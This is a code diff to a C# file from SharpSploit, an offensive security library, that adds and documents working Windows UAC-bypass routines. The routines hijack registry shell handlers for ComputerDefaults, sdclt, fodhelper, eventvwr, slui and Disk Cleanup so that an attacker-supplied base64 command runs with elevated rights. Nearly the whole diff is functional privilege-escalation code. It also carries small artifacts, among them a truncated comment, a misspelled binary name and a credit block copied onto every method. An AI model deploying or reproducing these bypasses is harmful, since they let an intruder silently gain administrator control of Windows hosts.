@@ -6,12 +6,12 @@ using System;
 using System.Text;
 using System.Linq;
 using System.Threading;
-using Microsoft.Win32;
 using System.Diagnostics;
 using System.ComponentModel;
 using System.Security.Principal;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
+using Microsoft.Win32;
 
 using SharpSploit.Execution;
 using PInvoke = SharpSploit.Execution.PlatformInvoke;
@@ -226,7 +226,7 @@ namespace SharpSploit.Credentials
                 this.OpenHandles.Add(hFilteredToken);
                 this.CloseHandle(hDuplicateToken);
 
-                // ImpersonateUser
+                // ImpersonateUser ; expec
                 Win32.WinBase._SECURITY_ATTRIBUTES securityAttributes2 = new Win32.WinBase._SECURITY_ATTRIBUTES();
                 IntPtr hDuplicateToken2 = IntPtr.Zero;
                 if (!PInvoke.Win32.Advapi32.DuplicateTokenEx(
@@ -265,7 +265,8 @@ namespace SharpSploit.Credentials
             return false;
 
         }
-       public bool AlwaysNotify()
+
+        public bool AlwaysNotify()
         {
             RegistryKey aNotify = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
             string consentPrompt = aNotify.GetValue("ConsentPromptBehaviorAdmin").ToString();
@@ -280,7 +281,15 @@ namespace SharpSploit.Credentials
             return false;
         }
 
-
+        /// <summary>
+        /// Bypasses UAC through Slui method (Requires Admin)
+        /// </summary>
+        /// <param name="encodedCommand">base64 encoded command to execute in high integrity</param>
+        /// <returns>True if UAC bypass succeeeds, false otherwise.</returns>
+        /// <remarks>
+        /// Credit for the UAC bypass token duplication technique goes to James Forshaw (@tiraniddo).
+        /// Credit for the PowerShell implementation of this bypass goes to Matt Nelson (@enigma0x3).
+        /// </remarks>
         public bool BypassUACSlui (string encodedCommand)
         {
             //Credit: https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
@@ -301,13 +310,12 @@ namespace SharpSploit.Credentials
             sluikey.SetValue("", @command);
             sluikey.Close();
 
-            //start fodhelper
+            //start Sluit.exe
             Process p = new Process();
             p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             p.StartInfo.FileName = "C:\\windows\\system32\\slui.exe";
             p.StartInfo.Verb = "runas";
             p.Start();
-
             //sleep 10 seconds to let the payload execute
             Thread.Sleep(10000);
 
@@ -315,16 +323,155 @@ namespace SharpSploit.Credentials
             newkey.DeleteSubKeyTree("exefile");
             return true;
         }
+        /// <summary>
+        /// Bypasses UAC through ComputerDefault method (Requires Admin)
+        /// </summary>
+        /// <param name="encodedCommand">base64 encoded command to execute in high integrity</param>
+        /// <returns>True if UAC bypass succeeeds, false otherwise.</returns>
+        /// <remarks>
+        /// Credit for the UAC bypass token duplication technique goes to James Forshaw (@tiraniddo).
+        /// Credit for the PowerShell implementation of this bypass goes to Matt Nelson (@enigma0x3).
+        /// </remarks>
+        public bool ComputerDefaults(string encodedCommand)
+        {
+            //Credit: https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1
+
+            //Check if UAC is set to 'Always Notify'
+            if (AlwaysNotify()) {
+                return false;
+            }
 
 
+            //Convert encoded command to a string
+            string command = Encoding.UTF8.GetString(Convert.FromBase64String(encodedCommand));
+
+            //Set the registry key for fodhelper
+            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
+            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");
+
+            RegistryKey fod = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
+            fod.SetValue("DelegateExecute", "");
+            fod.SetValue("", @command);
+            fod.Close();
+
+            //start fodhelper
+            Process p = new Process();
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.StartInfo.FileName = "C:\\windows\\system32\\ComputerDefaults.exe";
+            p.Start();
+
+            //sleep 10 seconds to let the payload execute
+            Thread.Sleep(10000);
+
+            //Unset the registry
+            newkey.DeleteSubKeyTree("ms-settings");
+            return true;
+        }
+
+        public static string GetWindowsVersion()
+        {
+            string registryPath = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion";
+            string build = null;
+            int number = 0;
+
+            try
+            {
+                build = Registry.GetValue(registryPath, "CurrentBuild", null).ToString();
+            }
+            catch { return null; }
+
+            number = Int32.Parse(build);
+
+            if (number == 7601)
+                return "Windows 7";
+            else if (number == 9200)
+                return "Windows 8";
+            else if (number == 9600)
+                return "Windows 8.1";
+            else if (number >= 10240 && number <= 19045)
+                return "Windows 10";
+            else if (number >= 22000)
+                return "Windows 11";
+            else
+                return "Older version";
+
+            /* Go here to find more build numbers and evaluate more conditions
+             * 
+             * https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions
+             * 
+             */ 
+        }
+        /// <summary>
+        /// Bypasses UAC through Sdctl method (Requires Admin)
+        /// </summary>
+        /// <param name="encodedCommand">base64 encoded command to execute in high integrity</param>
+        /// <returns>True if UAC bypass succeeeds, false otherwise.</returns>
+        /// <remarks>
+        /// Credit for the UAC bypass token duplication technique goes to James Forshaw (@tiraniddo).
+        /// Credit for the PowerShell implementation of this bypass goes to Matt Nelson (@enigma0x3).
+        /// </remarks>
+        public bool BypassUACSdclt (string encodedCommand)
+        {
+            // Credit: http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
+
+            //Check if UAC is set to 'Always Notify'
+            if (AlwaysNotify()) {
+                return false;
+            }
+
+            //This only appears to work on Windows 10. Check the version of the OS
+            RegistryKey osversion = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\");
+            string windowsVersion = osversion.GetValue("ProductName").ToString();
+            osversion.Close();
+            if (!GetWindowsVersion().Contains("10"))
+            {
+                System.Console.WriteLine("System is not Windows 10. This attack will fail. Exiting...");
+                System.Environment.Exit(1);
+            }
+
+            //Convert encoded command to a string
+            string command = Encoding.UTF8.GetString(Convert.FromBase64String(encodedCommand));
+
+            //Set the registry key
+            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
+            newkey.CreateSubKey(@"Folder\shell\open\command");
+
+            RegistryKey sdclt = Registry.CurrentUser.OpenSubKey(@"Software\Classes\Folder\shell\open\command", true);
+            sdclt.SetValue("", @command);
+            sdclt.SetValue("DelegateExecute", "");
+            sdclt.Close();
+
+            //start process
+            Process p = new Process();
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.StartInfo.FileName = "C:\\windows\\system32\\sdclt.exe";
+            p.Start();
+
+            //sleep 10 seconds to let the payload execute
+            Thread.Sleep(10000);
+
+            //Unset the registry
+            newkey.DeleteSubKeyTree("Folder");
+            return true;
+        }
+
+        /// <summary>
+        /// Bypasses UAC through DiskCleanUp method (Requires Admin)
+        /// </summary>
+        /// <param name="encodedCommand">base64 encoded command to execute in high integrity</param>
+        /// <returns>True if UAC bypass succeeeds, false otherwise.</returns>
+        /// <remarks>
+        /// Credit for the UAC bypass token duplication technique goes to James Forshaw (@tiraniddo).
+        /// Credit for the PowerShell implementation of this bypass goes to Matt Nelson (@enigma0x3).
+        /// </remarks>
         public bool BypassUACDiskCleanup(string encodedCommand)
         {
             //Credit: https://github.com/gushmazuko/WinBypass/blob/master/DiskCleanupBypass_direct.ps1
 
             //Check if UAC is set to 'Always Notify'
             if (AlwaysNotify()) {
-		    return false;
-	    }
+                return false;
+            }
 
             //Convert encoded command to a string
             string command = Encoding.UTF8.GetString(Convert.FromBase64String(encodedCommand));
@@ -333,7 +480,7 @@ namespace SharpSploit.Credentials
             if (!command.Contains("REM"))
             {
                 Console.WriteLine("Command must end in REM. Exiting...");
-		return false;
+                return false;
             }
 
             //Set the registry key for eventvwr
@@ -355,6 +502,15 @@ namespace SharpSploit.Credentials
             return true;
         }
 
+        /// <summary>
+        /// Bypasses UAC through ForHelper method (Requires Admin)
+        /// </summary>
+        /// <param name="encodedCommand">base64 encoded command to execute in high integrity</param>
+        /// <returns>True if UAC bypass succeeeds, false otherwise.</returns>
+        /// <remarks>
+        /// Credit for the UAC bypass token duplication technique goes to James Forshaw (@tiraniddo).
+        /// Credit for the PowerShell implementation of this bypass goes to Matt Nelson (@enigma0x3).
+        /// </remarks>
         public bool BypassUACFodHelper(string encodedCommand)
         {
             //Credit: https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1
@@ -390,6 +546,15 @@ namespace SharpSploit.Credentials
             return true;
         }
 
+        /// <summary>
+        /// Bypasses UAC through EventVwr method (Requires Admin)
+        /// </summary>
+        /// <param name="encodedCommand">base64 encoded command to execute in high integrity</param>
+        /// <returns>True if UAC bypass succeeeds, false otherwise.</returns>
+        /// <remarks>
+        /// Credit for the UAC bypass token duplication technique goes to James Forshaw (@tiraniddo).
+        /// Credit for the PowerShell implementation of this bypass goes to Matt Nelson (@enigma0x3).
+        /// </remarks>
         public bool BypassUACEventVwr(string encodedCommand)
         {
             //Credit: https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
@@ -422,6 +587,7 @@ namespace SharpSploit.Credentials
             return true;
 
         }
+
 
         /// <summary>
         /// Makes a new token to run a specified function as a specified user with a specified password. Automatically calls
